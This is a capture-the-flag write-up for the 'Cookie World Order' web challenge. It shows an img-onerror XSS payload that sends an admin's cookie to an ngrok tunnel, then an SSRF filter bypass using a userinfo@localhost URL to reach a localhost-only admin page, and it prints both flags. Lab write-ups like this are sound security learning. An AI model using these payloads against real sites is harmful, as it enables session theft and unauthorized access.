# Description
## Cookie World Order
Label: web

Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits.  Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!

# Solution
This task gives us a link [https://cwo-xss.web.ctfcompetition.com/](https://cwo-xss.web.ctfcompetition.com/). The website contains a video and a chat window on the right side. It appears that we are chatting with an admin and so it probably requires another xss. However, entering a tag like `<script>` will show up as `HACKER ALERT!`  so it seems that there is some kind check that matches against words like script. Playing around with other tags like `<img>` seem to work however so we can use that instead.

Again, I setup up a ngrok tunnel and used the `onerror` attribute of the `img` tag to send to cookie. This trick I learned about from [https://xss-game.appspot.com/](https://xss-game.appspot.com/)
```html
<img src="?" onerror="document.location='http://???.ngrok.io/?'+document.cookie">
```

Pasting that in the chat window gives us the cookie `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`

## Addendum
I saw a mention that there was another flag in this task. With the xss, we got another value called `auth` from the cookie. I originally ignored it but it seems to suggest that it is used to get another flag. Seeing that it was called auth, it was probably for the admin. Adding a cookie with `auth=token` and refreshing the page, gives us a new admin link in the top bar. Clicking on it leads to a `/admin` page with navgation for `Users` `Livestreams` and `Camera Controls`. `Camera Controls` is the only interesting one as the others are blank. It leads to `/admin/controls` and responds with `Requests only accepted from 127.0.0.1`. So we need the server to load the file for us. Luckily, the server does load a file: the livestream.webm. If we could get the server to load the `/admin/controls.html` page as a file instead that could work. Looking at the livestream url, it loads from `https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com`. Trying `https://cwo-xss.web.ctfcompetition.com/watch?livestream=/admin/controls.html`  doesn't work however. It gives `Forbidden. Your only allowed to make requests to "http://cwo-xss.web.ctfcompetition.com"`. After more attempts, it seems to just be doing a startswith check on the url so we need a way to have `http://cwo-xss.web.ctfcompetition.com` at the start but still have it resolve to a local file. This is where I learned about `Local file inclusion` where a file is included in the url and this can lead to vulnerabilities. In the [URI scheme](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier), there is a user field that can be specified so if we put `cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls.html` then it should pass the check and `127.0.0.1/admin/controls.html` will be the filepath. `https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls` does not work but `https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@localhost/admin/controls.html` does and gives the flag `CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}`
